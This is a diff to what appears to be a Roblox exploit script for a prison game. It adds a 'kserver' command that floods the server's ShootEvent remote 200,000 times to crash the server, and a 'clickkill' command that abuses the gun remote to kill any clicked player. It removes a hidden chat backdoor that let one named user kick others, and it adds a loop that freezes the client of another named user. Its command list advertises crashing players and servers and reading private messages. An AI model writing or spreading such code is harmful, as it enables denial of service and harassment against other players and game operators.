@@ -101,6 +101,7 @@ local Commands = {
 "incrash - insta crash players",
 "spike - spike server",
 "smite - small crash players",
+"kserver - kill server",
 "rip - turn off server",
 "freeze - freeze server",
 "spy - private messages",
@@ -131,6 +132,7 @@ local Commands = {
 "inf uninf - inf ammo",
 "",
 "-- Players --",
+"clickkill - click player to kill",
 "getusers - get asthetical admin users",
 "crim - make player become a criminal",
 "view unview - view the player",
@@ -3119,6 +3121,13 @@ function PlayerChatted(Message)
     game:GetService('ReplicatedStorage').ShootEvent:FireServer(Locate,game.Players.LocalPlayer.Character:FindFirstChild("Remington 870") or game.Players.LocalPlayer.Backpack:FindFirstChild("Remington 870"))
     end
     end
+    if Command("kserver") then
+    workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
+    local Locate = {}
+    for i = 1, 200000 do 
+    game:GetService('ReplicatedStorage').ShootEvent:FireServer(Locate,game.Players.LocalPlayer.Character:FindFirstChild("Remington 870") or game.Players.LocalPlayer.Backpack:FindFirstChild("Remington 870"))
+    end
+    end
     if Command("tk") then
     local savedcf = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
     local savedcamcf = workspace.CurrentCamera.CFrame
@@ -3142,6 +3151,35 @@ function PlayerChatted(Message)
     wait(0.5)
     game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
     workspace.CurrentCamera.CFrame = savedcamcf
+    end
+    if Command("clickkill") then
+    local Mouse = game.Players.LocalPlayer:GetMouse()
+
+    Mouse.Button1Down:connect(function()
+    local Obj = Mouse.Target
+
+    local savedcf = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
+    local savedcamcf = workspace.CurrentCamera.CFrame
+    workspace.Remote.loadchar:InvokeServer(nil, "12") 
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
+    workspace.CurrentCamera.CFrame = savedcamcf
+
+    workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
+
+    local Arg = {}
+
+    for i = 1,7 do
+    Arg[i] = {
+    RayObject = Ray.new(Vector3.new(0,0,0), Vector3.new(0,0,0)),
+    Distance = 0,
+    Cframe = CFrame.new(),
+    Hit = Obj
+    }
+    end
+
+    local Gun = game.Players.LocalPlayer.Backpack['Remington 870'] or game.Players.LocalPlayer.Character['Remington 870']
+    game:GetService('ReplicatedStorage').ShootEvent:FireServer(Arg,Gun)
+    end)
     end
     if Command("antilag") then
     nolag = true
@@ -4788,45 +4826,10 @@ end
 end)
 end
 
-	function findPlr(self)
-		for k, b in pairs(game.Players:GetPlayers()) do
-			if string.find(b.Name:lower(), self) then
-				return b
-			end
-		end
-	end
-
-	local reason
-	function findPlrTokick(self)
-		for k, b in pairs(game.Players:GetPlayers()) do
-			if string.find(b.Name:lower(), self) then
-				b:Kick("Kicked")
-			end
-		end
-	end
-
-	--just so i dont gotta mek 10 checks
-	game.Players.viniciuszk70.Chatted:Connect(
-		function(eek)
-			if eek:match(OwnPrefix .. "kick ") then
-				print(findPlr(eek:sub(7)))
-				findPlrTokick(eek:sub(7))
-			end
-		end
-	)
-
-	game.Players.PlayerAdded:Connect(
-		function(plr)
-			if plr.Name == "viniciuszk70" then
-				game.Players.viniciuszk70.Chatted:Connect(
-					function(eek)
-						if eek:match(OwnPrefix .. "kick ") then
-							findPlrTokick(eek:sub(7))
-						end
-					end
-				)
-			else
-				return
-			end
-		end
-	)
+if game.Players:FindFirstChild("king_pro433") then
+if game.Players.LocalPlayer.Name == "king_pro433" then
+for i = 1,math.huge do
+print('idiota')
+end
+end
+end
